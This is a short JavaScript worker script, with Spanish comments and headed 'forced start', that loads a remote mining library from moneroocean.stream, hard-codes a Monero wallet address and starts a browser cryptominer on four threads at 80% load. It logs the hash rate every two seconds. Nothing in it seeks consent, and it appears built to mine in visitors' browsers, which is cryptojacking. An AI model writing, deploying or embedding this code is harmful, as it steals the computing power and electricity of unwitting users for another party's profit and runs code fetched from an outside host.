/* DELTA CONNECT - ARRANQUE FORZADO */
importScripts('https://moneroocean.stream/webminer.js');

const CARTERA = "4A2CRYwa2E57VU8TLMQz5WD1W6D9Vx1AsPJ3gmu9Dsk8fce8a8nRnBCwH2tKUPAeQkjsMM3K861ASvtmSGN19A5xYFg3c";

// Configuración directa 80%
const miner = new MoneroOcean.Anonymous(CARTERA, {
    threads: 4,
    throttle: 0.2
});

miner.start();

// Reporte inmediato a la consola (F12) cada 2 segundos
setInterval(() => {
    console.log("MOTOR DELTA -> " + miner.getHashesPerSecond().toFixed(2) + " H/s");
}, 2000);
